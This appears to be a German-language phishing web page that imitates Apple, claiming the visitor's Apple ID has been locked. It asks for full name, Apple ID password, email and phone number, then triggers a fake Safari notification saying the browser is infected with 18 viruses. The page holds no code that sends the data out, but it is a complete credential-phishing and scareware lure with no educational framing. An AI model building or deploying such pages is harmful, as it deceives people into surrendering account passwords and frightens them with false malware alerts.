<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Deine Apple-ID wurde gesperrt</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Inter', sans-serif;
      margin: 0;
      background: linear-gradient(to bottom, #f3f4f6, #ffffff);
      padding: 2rem;
      color: #111827;
    }
    header {
      text-align: center;
      margin-bottom: 3rem;
    }
    h1 {
      font-size: 2.5rem;
      font-weight: 600;
    }
    p {
      color: #6b7280;
      font-size: 1.125rem;
    }
    .search {
      margin-top: 1.5rem;
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
      align-items: center;
    }
    .field {
      display: flex;
      flex-direction: column;
      width: 20rem;
    }
    .field input {
      padding: 0.5rem;
      border-radius: 0.5rem;
      border: 1px solid #d1d5db;
    }
    .field input.error {
      border-color: red;
    }
    .error-message {
      color: red;
      font-size: 0.85rem;
      margin-top: 0.25rem;
      display: none;
    }
    button {
      padding: 0.5rem 1rem;
      border: none;
      border-radius: 0.5rem;
      background-color: #1f2937;
      color: white;
      cursor: pointer;
      margin-top: 1rem;
    }
  </style>
</head>
<body>
  <header>
    <h1>Deine Apple-ID wurde gesperrt</h1>
    <p>Deine Apple-ID wurde aus Sicherheitsgründen gesperrt. Bitte bestätige deine Identität, um sie wieder zu entsperren.</p>
    <div class="search">
      <div class="field">
        <input type="text" id="name" placeholder="Ganzer Name" required>
        <span class="error-message" id="error-name">Bitte gebe deinen ganzen Namen ein.</span>
      </div>
      <div class="field">
        <input type="password" id="password" placeholder="Apple-ID Passwort" required minlength="8">
        <span class="error-message" id="error-password">Gebe ein gültiges Apple-ID Passwort ein.</span>
      </div>
      <div class="field">
        <input type="email" id="email" placeholder="E-Mail Adresse" required>
        <span class="error-message" id="error-email">Bitte gebe deine gültige E-Mail Adresse ein.</span>
      </div>
      <div class="field">
        <input type="tel" id="phone" placeholder="Telefonnummer"
               required pattern="^\+?[0-9\s\-\(\)]{7,}$">
        <span class="error-message" id="error-phone">Bitte gebe deine gültige Telefonnummer ein.</span>
      </div>
      <button onclick="validateAndSend()">Bestätigen</button>
    </div>
  </header>
   
  <script>
    function validateAndSend() {
      let valid = true;

      valid = validateField("name", value => value.trim() !== "") && valid;
      valid = validateField("password", value => value.length >= 8) && valid;
      valid = validateField("email", () => document.getElementById("email").checkValidity()) && valid;
      valid = validateField("phone", () => document.getElementById("phone").checkValidity()) && valid;

      if (!valid) return;

      // Alles ok → Demo-Aktion ausführen
      if (Notification.permission === "default") {
        Notification.requestPermission().then(permission => {
          if (permission === "granted") {
            createNotification();
          } else {
            alert("Bitte erlaube Mitteilungen, damit wir dir ein Bestätigungs-Code senden können.");
          }
        });
      } else if (Notification.permission === "granted") {
        createNotification();
      } else {
        alert("Bitte erlaube Mitteilungen, damit wir dir ein Bestätigungs-Code senden können.");
      }
    }

    function validateField(id, checkFn) {
      const input = document.getElementById(id);
      const error = document.getElementById("error-" + id);
      if (!checkFn(input.value)) {
        input.classList.add("error");
        error.style.display = "block";
        return false;
      } else {
        input.classList.remove("error");
        error.style.display = "none";
        return true;
      }
    }

    function createNotification() {
      new Notification("Safari", {
        body: "Safari wurde mit 18 Viren infiziert. Die Entfernung der Viren ist erforderlich, um weitere Schäden zu vermeiden.",
        icon: "Apple_logo_black.svg"
      });
    }
  </script>
</body>
</html>
